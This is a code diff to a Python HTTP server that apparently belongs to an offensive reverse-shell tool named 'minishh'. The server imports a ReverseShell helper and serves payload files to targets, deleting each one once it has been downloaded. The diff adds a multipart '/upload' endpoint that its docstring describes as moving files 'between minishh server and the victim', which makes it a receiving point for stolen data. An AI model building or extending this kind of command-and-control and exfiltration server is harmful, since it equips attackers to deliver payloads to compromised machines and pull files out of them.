@@ -2,6 +2,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from http import HTTPStatus
 from enum import Enum, auto
 from threading import Thread, Event
+from requests_toolbelt.multipart import decoder
 import os
 import requests
 from utils.pwsh_utils import ReverseShell
@@ -15,6 +16,21 @@ class ServerStatus(Enum):
 class HttpDeliveringServer(BaseHTTPRequestHandler):
 
     files_to_deliver = {"tmp_routes": {}, "permanent_routes": {}}
+    files_to_receive = {"/upload": ""}
+
+    def __init__(self, *args, **kwargs):
+        self.server_version = "MinishhHttp/0.8"
+        self.sys_version = ''
+        super().__init__(*args, **kwargs)
+
+    @classmethod
+    def notify_upload(cls, route, filename):
+        cls.files_to_receive[route] = filename
+
+    @classmethod
+    def remove_file_upload(cls, route):
+        if route in cls.files_to_receive:
+            del cls.files_to_receive[route]
 
     @classmethod
     def notify_download(cls, route, filename):
@@ -58,9 +74,36 @@ class HttpDeliveringServer(BaseHTTPRequestHandler):
 
             self.wfile.write(content)
 
+            # Once download done, remove the file from the temp route
+            self.remove_file(self.path)
+
         else:
             self.send_response(HTTPStatus.NOT_FOUND)
             self.end_headers()
+
+    def do_POST(self):
+        """
+        Method allowing file transfer between minishh server and the victim
+        """
+        try:
+            content_type = self.headers.get("Content-Type")
+            if (content_type is not None and 'boundary=' in content_type and self.path == '/upload'):
+                post_request = self.rfile.read1()
+                multipart_data = decoder.MultipartDecoder(post_request, content_type)
+                for part in multipart_data.parts:
+                    # Do save file
+                    print(part.content) # part.headers contains the file_name
+                
+                self.send_response(HTTPStatus.OK)
+                self.end_headers()
+
+            else:
+                self.send_response(HTTPStatus.NOT_FOUND)
+                self.end_headers()
+
+        except Exception as e:
+            Printer.err(e)
+            pass
 
     def log_message(self, format, request_proto, status_code, *args):
         splited_req = request_proto.split()
@@ -70,7 +113,6 @@ class HttpDeliveringServer(BaseHTTPRequestHandler):
 
         if int(status_code) == HTTPStatus.OK:
             Printer.cr().dbg(f'File downloaded [green]successfully[/green] from {self.address_string()} -->  [blue]{route}[/blue]')
-
 
 class HttpServer(Thread):
     """
